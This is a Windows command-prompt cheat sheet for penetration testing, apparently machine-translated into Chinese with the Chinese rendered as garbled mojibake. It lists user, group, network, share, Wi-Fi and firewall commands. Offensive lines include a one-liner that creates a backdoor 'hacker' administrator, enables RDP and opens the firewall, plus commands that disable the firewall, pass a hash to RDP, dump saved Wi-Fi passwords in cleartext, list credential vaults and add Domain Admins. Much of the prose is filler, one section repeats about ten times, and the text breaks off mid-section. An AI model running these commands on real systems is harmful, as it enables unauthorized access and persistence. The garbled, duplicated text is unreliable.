é€šè¿‡ä»”ç»†åˆ†æäº‹ä»¶æ—¥å¿—ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥æ·±å…¥äº†è§£ç³»ç»Ÿæˆ–ç½‘ç»œçš„å®‰å…¨çŠ¶å†µï¼Œå¹¶è¯†åˆ«æ½œåœ¨çš„æ¼æ´æˆ–å®‰å…¨æ¼æ´ã€‚
```bash
#Make a security query using another credentials
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321
```
## ç”¨æˆ·å’Œç»„

### ç”¨æˆ·

#### æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·

```bash
whoami
```

#### æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·

```bash
net user
```

#### æŸ¥çœ‹ç”¨æˆ·è¯¦ç»†ä¿¡æ¯

```bash
net user <username>
```

#### åˆ›å»ºæ–°ç”¨æˆ·

```bash
net user <username> <password> /add
```

#### åˆ é™¤ç”¨æˆ·

```bash
net user <username> /delete
```

#### ä¿®æ”¹ç”¨æˆ·å¯†ç 

```bash
net user <username> <new_password>
```

### ç»„

#### æŸ¥çœ‹æ‰€æœ‰ç»„

```bash
net localgroup
```

#### æŸ¥çœ‹ç»„æˆå‘˜

```bash
net localgroup <groupname>
```

#### åˆ›å»ºæ–°ç»„

```bash
net localgroup <groupname> /add
```

#### åˆ é™¤ç»„

```bash
net localgroup <groupname> /delete
```

#### å°†ç”¨æˆ·æ·»åŠ åˆ°ç»„

```bash
net localgroup <groupname> <username> /add
```

#### ä»ç»„ä¸­åˆ é™¤ç”¨æˆ·

```bash
net localgroup <groupname> <username> /delete
```
```bash
#Me
whoami /all #All info about me, take a look at the enabled tokens
whoami /priv #Show only privileges

# Local users
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
wmic USERACCOUNT Get Domain,Name,Sid
net user /add [username] [password] #Create user

# Other users looged
qwinsta #Anyone else logged in?

#Lauch new cmd.exe with new creds (to impersonate in network)
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe
```
### ç”¨æˆ·ç»„

User groups are a way to organize and manage users on a system. Each user can be a member of one or more groups, and groups can have certain permissions and access rights assigned to them. In Windows, there are several built-in groups that serve specific purposes. Here are some commonly used groups:

- **Administrators**: This group has full control over the system and can perform any administrative task.
- **Users**: This group includes all standard users on the system.
- **Guests**: This group provides limited access to the system for guest users.
- **Power Users**: This group has more privileges than standard users but fewer than administrators.
- **Backup Operators**: Members of this group can perform backup and restore operations on the system.
- **Remote Desktop Users**: This group is allowed to access the system remotely using Remote Desktop.
- **Network Configuration Operators**: Members of this group can manage network configuration settings.
- **Print Operators**: Members of this group can manage printers on the system.
- **Event Log Readers**: Members of this group can read event logs on the system.

To view the groups on a Windows system, you can use the `net localgroup` command. For example, to list all the groups, you can run:

```plaintext
net localgroup
```

To view the members of a specific group, you can use the `net localgroup <groupname>` command. For example, to view the members of the Administrators group, you can run:

```plaintext
net localgroup Administrators
```

To add a user to a group, you can use the `net localgroup <groupname> <username> /add` command. For example, to add a user named "john" to the Administrators group, you can run:

```plaintext
net localgroup Administrators john /add
```

To remove a user from a group, you can use the `net localgroup <groupname> <username> /delete` command. For example, to remove a user named "john" from the Administrators group, you can run:

```plaintext
net localgroup Administrators john /delete
```

Remember that administrative privileges are required to perform these operations.
```bash
#Local
net localgroup #All available groups
net localgroup Administrators #Info about a group (admins)
net localgroup administrators [username] /add #Add user to administrators

#Domain
net group /domain #Info about domain groups
net group /domain <domain_group_name> #Users that belongs to the group
```
### åˆ—å‡ºä¼šè¯

To list the active sessions in a Windows system, you can use the following command:

```plaintext
C:\> net session
```

This command will display a list of all active sessions on the system, including the username, computer name, and session ID.
```
qwinsta
klist sessions
```
### å¯†ç ç­–ç•¥

A strong password policy is essential for maintaining the security of a system. It helps to prevent unauthorized access and protects sensitive information. Here are some key elements to consider when implementing a password policy:

- **Password Complexity**: Require users to create passwords that are complex and difficult to guess. This can be achieved by enforcing a minimum length, including a combination of uppercase and lowercase letters, numbers, and special characters.

- **Password Expiration**: Set a time limit for password expiration. This ensures that users regularly update their passwords and reduces the risk of compromised accounts.

- **Password History**: Implement a password history feature that prevents users from reusing their previous passwords. This helps to prevent attackers from gaining access to an account by guessing a previously used password.

- **Account Lockout**: Implement an account lockout policy that temporarily locks an account after a certain number of failed login attempts. This helps to prevent brute-force attacks and unauthorized access.

- **Password Recovery**: Implement a secure password recovery process that verifies the identity of the user before allowing them to reset their password. This helps to prevent unauthorized password resets.

By implementing a strong password policy, organizations can significantly enhance the security of their systems and protect against unauthorized access.
```
net accounts
```
### å‡­è¯

Credentials (å‡­è¯) æ˜¯ç”¨äºéªŒè¯ç”¨æˆ·èº«ä»½çš„ä¿¡æ¯ï¼Œé€šå¸¸åŒ…æ‹¬ç”¨æˆ·åå’Œå¯†ç ã€‚åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œè·å–å‡­è¯æ˜¯ä¸€é¡¹é‡è¦çš„ä»»åŠ¡ï¼Œå› ä¸ºå®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬è·å¾—å¯¹ç›®æ ‡ç³»ç»Ÿçš„è®¿é—®æƒé™ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å‡­è¯è·å–æŠ€æœ¯ï¼š

- ç¤¾ä¼šå·¥ç¨‹å­¦ï¼šé€šè¿‡æ¬ºéª—ã€è¯±éª—æˆ–æ“çºµäººå‘˜æ¥è·å–å‡­è¯ä¿¡æ¯ã€‚
- å­—å…¸æ”»å‡»ï¼šä½¿ç”¨é¢„å…ˆç”Ÿæˆçš„å¯†ç åˆ—è¡¨å°è¯•çŒœæµ‹ç”¨æˆ·å¯†ç ã€‚
- æš´åŠ›ç ´è§£ï¼šé€šè¿‡å°è¯•æ‰€æœ‰å¯èƒ½çš„å¯†ç ç»„åˆæ¥ç ´è§£ç”¨æˆ·å¯†ç ã€‚
- å—…æ¢ï¼šæˆªè·ç½‘ç»œæµé‡ä»¥è·å–å‡­è¯ä¿¡æ¯ã€‚
- ä¸­é—´äººæ”»å‡»ï¼šåœ¨ç”¨æˆ·å’Œç›®æ ‡ç³»ç»Ÿä¹‹é—´æ’å…¥è‡ªå·±çš„è®¾å¤‡ï¼Œä»¥æˆªè·å‡­è¯ä¿¡æ¯ã€‚
- æ“ä½œç³»ç»Ÿæ¼æ´åˆ©ç”¨ï¼šåˆ©ç”¨æ“ä½œç³»ç»Ÿçš„æ¼æ´æ¥è·å–å‡­è¯ä¿¡æ¯ã€‚

åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™äº›æŠ€æœ¯æ¥è·å–ç›®æ ‡ç³»ç»Ÿçš„å‡­è¯ï¼Œä»è€Œè¿›ä¸€æ­¥æ·±å…¥ç³»ç»Ÿå¹¶æ‰§è¡Œå…¶ä»–æ”»å‡»ã€‚
```bash
cmdkey /list #List credential
vaultcmd /listcreds:"Windows Credentials" /all #List Windows vault
rundll32 keymgr.dll, KRShowKeyMgr #You need graphical access
```
### æŒä¹…åŒ–ä¸ç”¨æˆ·

#### Add a user to the local administrators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„

```plaintext
net localgroup administrators <username> /add
```

#### Add a user to the local Remote Desktop Users group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°è¿œç¨‹æ¡Œé¢ç”¨æˆ·ç»„

```plaintext
net localgroup "Remote Desktop Users" <username> /add
```

#### Add a user to the local Remote Management Users group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°è¿œç¨‹ç®¡ç†ç”¨æˆ·ç»„

```plaintext
net localgroup "Remote Management Users" <username> /add
```

#### Add a user to the local Power Users group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°Power Usersç»„

```plaintext
net localgroup "Power Users" <username> /add
```

#### Add a user to the local Backup Operators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°å¤‡ä»½æ“ä½œå‘˜ç»„

```plaintext
net localgroup "Backup Operators" <username> /add
```

#### Add a user to the local Performance Monitor Users group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°æ€§èƒ½ç›‘è§†å™¨ç”¨æˆ·ç»„

```plaintext
net localgroup "Performance Monitor Users" <username> /add
```

#### Add a user to the local Performance Log Users group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°æ€§èƒ½æ—¥å¿—ç”¨æˆ·ç»„

```plaintext
net localgroup "Performance Log Users" <username> /add
```

#### Add a user to the local Event Log Readers group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°äº‹ä»¶æ—¥å¿—è¯»å–å™¨ç»„

```plaintext
net localgroup "Event Log Readers" <username> /add
```

#### Add a user to the local Distributed COM Users group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°åˆ†å¸ƒå¼COMç”¨æˆ·ç»„

```plaintext
net localgroup "Distributed COM Users" <username> /add
```

#### Add a user to the local IIS_IUSRS group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°IIS_IUSRSç»„

```plaintext
net localgroup "IIS_IUSRS" <username> /add
```

#### Add a user to the local Cryptographic Operators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°åŠ å¯†æ“ä½œå‘˜ç»„

```plaintext
net localgroup "Cryptographic Operators" <username> /add
```

#### Add a user to the local Hyper-V Administrators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°Hyper-Vç®¡ç†å‘˜ç»„

```plaintext
net localgroup "Hyper-V Administrators" <username> /add
```

#### Add a user to the local Hyper-V Administrators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°Hyper-Vç®¡ç†å‘˜ç»„

```plaintext
net localgroup "Hyper-V Administrators" <username> /add
```

#### Add a user to the local Hyper-V Administrators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°Hyper-Vç®¡ç†å‘˜ç»„

```plaintext
net localgroup "Hyper-V Administrators" <username> /add
```

#### Add a user to the local Hyper-V Administrators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°Hyper-Vç®¡ç†å‘˜ç»„

```plaintext
net localgroup "Hyper-V Administrators" <username> /add
```

#### Add a user to the local Hyper-V Administrators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°Hyper-Vç®¡ç†å‘˜ç»„

```plaintext
net localgroup "Hyper-V Administrators" <username> /add
```

#### Add a user to the local Hyper-V Administrators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°Hyper-Vç®¡ç†å‘˜ç»„

```plaintext
net localgroup "Hyper-V Administrators" <username> /add
```

#### Add a user to the local Hyper-V Administrators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°Hyper-Vç®¡ç†å‘˜ç»„

```plaintext
net localgroup "Hyper-V Administrators" <username> /add
```

#### Add a user to the local Hyper-V Administrators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°Hyper-Vç®¡ç†å‘˜ç»„

```plaintext
net localgroup "Hyper-V Administrators" <username> /add
```

#### Add a user to the local Hyper-V Administrators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°Hyper-Vç®¡ç†å‘˜ç»„

```plaintext
net localgroup "Hyper-V Administrators" <username> /add
```

#### Add a user to the local Hyper-V Administrators group

#### å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°Hyper-Vç®¡ç†å‘˜ç»„

```plaintext
net localgroup "Hyper-V Administrators" <username> /add
```
```bash
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add
```
## ç½‘ç»œ

### æ¥å£ã€è·¯ç”±ã€ç«¯å£ã€ä¸»æœºå’ŒDNSç¼“å­˜

#### Interfaces (æ¥å£)

To view the network interfaces on a Windows system, you can use the `ipconfig` command. This command will display information about all the network interfaces, including their IP addresses, subnet masks, and default gateways.

```plaintext
ipconfig
```

#### Routes (è·¯ç”±)

To view the routing table on a Windows system, you can use the `route print` command. This command will display information about the routes configured on the system, including the destination network, subnet mask, gateway, and interface.

```plaintext
route print
```

#### Ports (ç«¯å£)

To view the open ports on a Windows system, you can use the `netstat` command. This command will display a list of all the active connections and listening ports on the system.

```plaintext
netstat -ano
```

#### Hosts (ä¸»æœº)

To view the hosts file on a Windows system, you can use the `notepad` command. This command will open the hosts file in Notepad, allowing you to view and edit its contents.

```plaintext
notepad C:\Windows\System32\drivers\etc\hosts
```

#### DNSCache (DNSç¼“å­˜)

To view the DNS cache on a Windows system, you can use the `ipconfig /displaydns` command. This command will display a list of all the DNS entries that have been cached by the system.

```plaintext
ipconfig /displaydns
```
```bash
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Know hosts
netstat -ano #Opened ports?
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
```
### é˜²ç«å¢™

A firewall is a network security device that monitors and filters incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between a trusted internal network and an untrusted external network, such as the internet. Firewalls can be implemented as hardware devices or software programs.

é˜²ç«å¢™æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨è®¾å¤‡ï¼Œæ ¹æ®é¢„å®šçš„å®‰å…¨è§„åˆ™ç›‘æ§å’Œè¿‡æ»¤è¿›å‡ºçš„ç½‘ç»œæµé‡ã€‚å®ƒå……å½“å¯ä¿¡ä»»çš„å†…éƒ¨ç½‘ç»œå’Œä¸å¯ä¿¡ä»»çš„å¤–éƒ¨ç½‘ç»œï¼ˆå¦‚äº’è”ç½‘ï¼‰ä¹‹é—´çš„å±éšœã€‚é˜²ç«å¢™å¯ä»¥ä½œä¸ºç¡¬ä»¶è®¾å¤‡æˆ–è½¯ä»¶ç¨‹åºå®ç°ã€‚

Firewalls can be configured to allow or block specific types of traffic based on various criteria, such as source IP address, destination IP address, port number, and protocol. They help protect networks from unauthorized access, malicious attacks, and data breaches.

é˜²ç«å¢™å¯ä»¥æ ¹æ®å„ç§æ ‡å‡†ï¼ˆå¦‚æºIPåœ°å€ã€ç›®æ ‡IPåœ°å€ã€ç«¯å£å·å’Œåè®®ï¼‰é…ç½®å…è®¸æˆ–é˜»æ­¢ç‰¹å®šç±»å‹çš„æµé‡ã€‚å®ƒä»¬æœ‰åŠ©äºä¿æŠ¤ç½‘ç»œå…å—æœªç»æˆæƒçš„è®¿é—®ã€æ¶æ„æ”»å‡»å’Œæ•°æ®æ³„éœ²çš„å½±å“ã€‚

Firewalls are an essential component of network security and are commonly used in both home and enterprise environments. They provide an additional layer of defense by controlling and monitoring network traffic, reducing the risk of unauthorized access and potential security breaches.

é˜²ç«å¢™æ˜¯ç½‘ç»œå®‰å…¨çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå¹¿æ³›åº”ç”¨äºå®¶åº­å’Œä¼ä¸šç¯å¢ƒã€‚å®ƒä»¬é€šè¿‡æ§åˆ¶å’Œç›‘æ§ç½‘ç»œæµé‡æä¾›äº†é¢å¤–çš„é˜²å¾¡å±‚ï¼Œé™ä½äº†æœªç»æˆæƒè®¿é—®å’Œæ½œåœ¨å®‰å…¨æ¼æ´çš„é£é™©ã€‚
```bash
netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off

#How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop"

#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

#Enable Remote Desktop with wmic
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
##or
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

#Enable Remote assistance:
reg add â€œHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Serverâ€ /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

::Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
```
### å…±äº«

Sharesï¼ˆå…±äº«ï¼‰æ˜¯æŒ‡åœ¨Windowsç³»ç»Ÿä¸­å…±äº«æ–‡ä»¶å¤¹æˆ–æ‰“å°æœºï¼Œä»¥ä¾¿å…¶ä»–ç”¨æˆ·å¯ä»¥è®¿é—®å’Œä½¿ç”¨å®ƒä»¬ã€‚å…±äº«å¯ä»¥åœ¨æœ¬åœ°ç½‘ç»œä¸Šçš„å¤šå°è®¡ç®—æœºä¹‹é—´å…±äº«æ–‡ä»¶å’Œèµ„æºã€‚

#### æŸ¥çœ‹å…±äº«

è¦æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸Šçš„å…±äº«ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```plaintext
net share
```

è¿™å°†æ˜¾ç¤ºæ‰€æœ‰å…±äº«çš„åç§°å’Œè·¯å¾„ã€‚

#### åˆ›å»ºå…±äº«

è¦åˆ›å»ºä¸€ä¸ªæ–°çš„å…±äº«ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```plaintext
net share <share_name>=<path> [/GRANT:<user>,<permissions>] [/REMARK:<text>]
```

å…¶ä¸­ï¼Œ`<share_name>` æ˜¯å…±äº«çš„åç§°ï¼Œ`<path>` æ˜¯å…±äº«çš„è·¯å¾„ã€‚å¯é€‰çš„ `/GRANT` å‚æ•°ç”¨äºæŒ‡å®šç”¨æˆ·å’Œæƒé™ï¼Œ`/REMARK` å‚æ•°ç”¨äºæ·»åŠ å¤‡æ³¨ã€‚

#### åˆ é™¤å…±äº«

è¦åˆ é™¤ä¸€ä¸ªå…±äº«ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```plaintext
net share <share_name> /DELETE
```

å…¶ä¸­ï¼Œ`<share_name>` æ˜¯è¦åˆ é™¤çš„å…±äº«çš„åç§°ã€‚

#### ä¿®æ”¹å…±äº«æƒé™

è¦ä¿®æ”¹å…±äº«çš„æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```plaintext
net share <share_name> /GRANT:<user>,<permissions>
```

å…¶ä¸­ï¼Œ`<share_name>` æ˜¯è¦ä¿®æ”¹æƒé™çš„å…±äº«çš„åç§°ï¼Œ`<user>` æ˜¯è¦æˆäºˆæƒé™çš„ç”¨æˆ·ï¼Œ`<permissions>` æ˜¯è¦æˆäºˆçš„æƒé™ã€‚

#### è¿æ¥å…±äº«

è¦è¿æ¥åˆ°ä¸€ä¸ªå…±äº«ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```plaintext
net use <drive_letter>: \\server\share [/USER:<user>] [<password>]
```

å…¶ä¸­ï¼Œ`<drive_letter>` æ˜¯è¦åˆ†é…ç»™å…±äº«çš„é©±åŠ¨å™¨å·ï¼Œ`\\server\share` æ˜¯å…±äº«çš„è·¯å¾„ï¼Œ`/USER` å‚æ•°ç”¨äºæŒ‡å®šç”¨æˆ·åï¼Œ`<password>` æ˜¯ç”¨æˆ·çš„å¯†ç ã€‚

#### æ–­å¼€å…±äº«è¿æ¥

è¦æ–­å¼€ä¸å…±äº«çš„è¿æ¥ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```plaintext
net use <drive_letter> /DELETE
```

å…¶ä¸­ï¼Œ`<drive_letter>` æ˜¯è¦æ–­å¼€è¿æ¥çš„é©±åŠ¨å™¨å·ã€‚
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### Wifiï¼ˆæ— çº¿ç½‘ç»œï¼‰

#### æŸ¥çœ‹å·²è¿æ¥çš„Wifiç½‘ç»œ

```plaintext
netsh wlan show interfaces
```

#### æŸ¥çœ‹å¯ç”¨çš„Wifiç½‘ç»œ

```plaintext
netsh wlan show networks
```

#### è¿æ¥åˆ°Wifiç½‘ç»œ

```plaintext
netsh wlan connect name="Wifiåç§°"
```

#### æ–­å¼€Wifiç½‘ç»œè¿æ¥

```plaintext
netsh wlan disconnect
```

#### æŸ¥çœ‹å·²ä¿å­˜çš„Wifiå¯†ç 

```plaintext
netsh wlan show profile name="Wifiåç§°" key=clear
```

#### å¿˜è®°å·²ä¿å­˜çš„Wifiå¯†ç 

```plaintext
netsh wlan delete profile name="Wifiåç§°"
```

#### åˆ›å»ºWifiçƒ­ç‚¹

```plaintext
netsh wlan set hostednetwork mode=allow ssid="çƒ­ç‚¹åç§°" key="å¯†ç "
netsh wlan start hostednetwork
```

#### åœæ­¢Wifiçƒ­ç‚¹

```plaintext
netsh wlan stop hostednetwork
```

#### æŸ¥çœ‹å·²è¿æ¥çš„Wifiå®¢æˆ·ç«¯

```plaintext
netsh wlan show hostednetwork
```

#### å…±äº«ç½‘ç»œè¿æ¥

```plaintext
netsh wlan set hostednetwork mode=allow ssid="çƒ­ç‚¹åç§°" key="å¯†ç "
netsh wlan start hostednetwork
```

#### åœæ­¢ç½‘ç»œè¿æ¥å…±äº«

```plaintext
netsh wlan stop hostednetwork
```

#### æŸ¥çœ‹å·²å…±äº«çš„ç½‘ç»œè¿æ¥

```plaintext
netsh wlan show hostednetwork
```

#### ä¿®æ”¹Wifiçƒ­ç‚¹è®¾ç½®

```plaintext
netsh wlan set hostednetwork mode=allow ssid="çƒ­ç‚¹åç§°" key="å¯†ç "
netsh wlan stop hostednetwork
netsh wlan start hostednetwork
```
```bash
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
```
### SNMP

SNMPï¼ˆSimple Network Management Protocolï¼‰æ˜¯ä¸€ç§ç”¨äºç®¡ç†å’Œç›‘æ§ç½‘ç»œè®¾å¤‡çš„åè®®ã€‚å®ƒå…è®¸ç®¡ç†å‘˜é€šè¿‡å‘é€å’Œæ¥æ”¶æ¶ˆæ¯æ¥è·å–æœ‰å…³è®¾å¤‡çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç³»ç»ŸçŠ¶æ€ã€ç½‘ç»œæµé‡å’Œé”™è¯¯æŠ¥å‘Šã€‚SNMPä½¿ç”¨åŸºäºUDPçš„ä¼ è¾“åè®®ï¼Œå¹¶ä½¿ç”¨MIBï¼ˆManagement Information Baseï¼‰æ¥å®šä¹‰è®¾å¤‡ä¸Šå¯ç”¨çš„ä¿¡æ¯ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨SNMPåè®®æ¥æ”¶é›†æœ‰å…³ç›®æ ‡ç½‘ç»œè®¾å¤‡çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€å¼€æ”¾ç«¯å£å’Œé…ç½®è®¾ç½®ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©æ”»å‡»è€…è¯†åˆ«æ½œåœ¨çš„æ¼æ´å’Œæ”»å‡»è·¯å¾„ã€‚
```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```
### ç½‘ç»œæ¥å£

Network interfaces, also known as network adapters or NICs (Network Interface Cards), are hardware devices that allow computers to connect to a network. They provide the necessary physical connection between the computer and the network, enabling data transmission.

ç½‘ç»œæ¥å£ï¼Œä¹Ÿç§°ä¸ºç½‘ç»œé€‚é…å™¨æˆ–NICï¼ˆç½‘ç»œæ¥å£å¡ï¼‰ï¼Œæ˜¯å…è®¸è®¡ç®—æœºè¿æ¥åˆ°ç½‘ç»œçš„ç¡¬ä»¶è®¾å¤‡ã€‚å®ƒä»¬æä¾›äº†è®¡ç®—æœºä¸ç½‘ç»œä¹‹é—´çš„å¿…è¦ç‰©ç†è¿æ¥ï¼Œå®ç°æ•°æ®ä¼ è¾“ã€‚

In Windows, you can view and manage network interfaces using the `ipconfig` command. This command displays detailed information about each network interface, including its IP address, subnet mask, default gateway, and more.

åœ¨Windowsä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`ipconfig`å‘½ä»¤æŸ¥çœ‹å’Œç®¡ç†ç½‘ç»œæ¥å£ã€‚è¯¥å‘½ä»¤æ˜¾ç¤ºæ¯ä¸ªç½‘ç»œæ¥å£çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¶IPåœ°å€ã€å­ç½‘æ©ç ã€é»˜è®¤ç½‘å…³ç­‰ã€‚

To view the network interfaces, open a command prompt and type `ipconfig`. This will display a list of all network interfaces on the system, along with their corresponding information.

è¦æŸ¥çœ‹ç½‘ç»œæ¥å£ï¼Œè¯·æ‰“å¼€å‘½ä»¤æç¤ºç¬¦å¹¶é”®å…¥`ipconfig`ã€‚è¿™å°†æ˜¾ç¤ºç³»ç»Ÿä¸Šæ‰€æœ‰ç½‘ç»œæ¥å£çš„åˆ—è¡¨ï¼Œä»¥åŠå®ƒä»¬çš„ç›¸åº”ä¿¡æ¯ã€‚

You can also use the `ipconfig /all` command to view additional information about the network interfaces, such as the MAC address, DNS servers, and DHCP lease information.

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨`ipconfig /all`å‘½ä»¤æŸ¥çœ‹æœ‰å…³ç½‘ç»œæ¥å£çš„å…¶ä»–ä¿¡æ¯ï¼Œä¾‹å¦‚MACåœ°å€ã€DNSæœåŠ¡å™¨å’ŒDHCPç§Ÿçº¦ä¿¡æ¯ã€‚

In addition to `ipconfig`, you can use the `netsh` command to manage network interfaces. The `netsh` command provides more advanced options for configuring and troubleshooting network interfaces.

é™¤äº†`ipconfig`ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨`netsh`å‘½ä»¤æ¥ç®¡ç†ç½‘ç»œæ¥å£ã€‚`netsh`å‘½ä»¤æä¾›äº†æ›´é«˜çº§çš„é€‰é¡¹ï¼Œç”¨äºé…ç½®å’Œæ•…éšœæ’é™¤ç½‘ç»œæ¥å£ã€‚

For example, you can use the `netsh interface show interface` command to display a list of all network interfaces, along with their operational status and other information.

ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨`netsh interface show interface`å‘½ä»¤æ˜¾ç¤ºæ‰€æœ‰ç½‘ç»œæ¥å£çš„åˆ—è¡¨ï¼Œä»¥åŠå®ƒä»¬çš„æ“ä½œçŠ¶æ€å’Œå…¶ä»–ä¿¡æ¯ã€‚

Understanding and managing network interfaces is essential for network troubleshooting and configuration. By using the appropriate commands, you can easily view and modify network interface settings to ensure optimal network connectivity.
```bash
ipconfig /all
```
### ARPè¡¨

The ARP (Address Resolution Protocol) table is a network mapping table that associates IP addresses with their corresponding MAC addresses. It is used by network devices to determine the MAC address of a destination IP address before sending data packets. The ARP table is stored in the memory of a device and is constantly updated as devices communicate on the network.

To view the ARP table on a Windows system, you can use the `arp` command in the command prompt. Simply open the command prompt and type `arp -a` to display the ARP table. The output will show the IP addresses and corresponding MAC addresses of devices that the system has communicated with.

The ARP table is useful for troubleshooting network connectivity issues, identifying devices on the network, and detecting potential ARP spoofing attacks. By analyzing the ARP table, you can verify if the correct MAC address is associated with each IP address and identify any discrepancies or suspicious entries.

It's important to note that the ARP table is specific to each device and is not shared across the network. Therefore, each device maintains its own ARP table based on its network interactions.
```bash
arp -A
```
## ä¸‹è½½

Bitsadmin.exe
```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```
# CertReq.exe

CertReq.exe is a command-line tool in Windows that is used to create and submit certificate requests to a certification authority (CA). It is commonly used by system administrators and security professionals for managing certificates in a Windows environment.

## Syntax

The basic syntax for using CertReq.exe is as follows:

```plaintext
